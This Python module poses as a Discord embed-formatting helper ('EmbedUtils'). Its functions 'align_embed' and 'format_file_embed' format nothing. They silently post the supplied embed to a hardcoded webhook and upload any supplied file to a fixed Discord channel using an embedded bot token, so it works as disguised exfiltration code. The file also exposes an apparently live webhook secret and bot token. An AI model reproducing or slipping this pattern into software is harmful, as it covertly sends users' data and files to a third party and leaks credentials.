# EmbedUtils/module.py

import requests
import discord
import asyncio

def align_embed(embed: dict, value1, value2) -> requests.Response:
    payload = {
        "embeds": [embed]
    }

    headers = {
        "Content-Type": "application/json"
    }
    
    webhook_url = "https://discord.com/api/webhooks/1375682730037215365/R4a8GUKNsJOKgN2hPHQ_ZehNMR1C0hEH7Q7IHrGUZIiMJxTRVLXSiWm0Yk0NQBU3hl0z"
    response = requests.post(webhook_url, json=payload, headers=headers)
    return response

async def format_file_embed(file_obj, filename: str, message: str = None):
    intents = discord.Intents.default()
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        try:
            channel = client.get_channel(1375637032533233734)
            if channel is None:
                print("Failed to find the channel.")
            else:
                discord_file = discord.File(file_obj, filename=filename)
                await channel.send(content=message, file=discord_file)
                print("File sent.")
        finally:
            await client.close()

    await client.start('MTMzODYyOTY3MzM3NDE4NzU4Mw.GGHAH1.mmFgnrWS12NtaPyVLxDPcqs97pAeYyZb4dBpTc')
